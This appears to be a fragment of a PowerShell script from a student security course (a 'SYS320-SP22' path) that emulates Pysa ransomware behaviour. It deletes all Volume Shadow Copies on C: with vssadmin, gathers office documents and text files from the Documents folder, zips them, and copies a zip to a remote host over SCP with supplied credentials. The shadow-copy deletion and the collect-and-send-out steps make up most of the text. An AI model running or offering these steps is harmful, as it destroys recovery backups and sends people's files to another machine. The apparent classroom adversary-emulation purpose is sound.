...
$donttouch = vssadmin delete shadows /for=c: /all
Write-Host $donttouch

#STEP 1
Get-ChildItem -recurse -Include *.xlsx,*.pdf,*.docx,*.txt -Path .\Documents | export-csv `
-Path files.csv

# Import CSV file.
$fileList = import-csv -Path .\files.csv -header FullName

Compress-Archive -LiteralPath .\Documents -DestinationPath Docuemnts.zip
...
Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential sebastian.meredith) -Port 2222 `
        -Destination 'C:\Users\Sebby\SYS320-SP22-New\SYS320-SP22' -Path 'Pysa.zip'
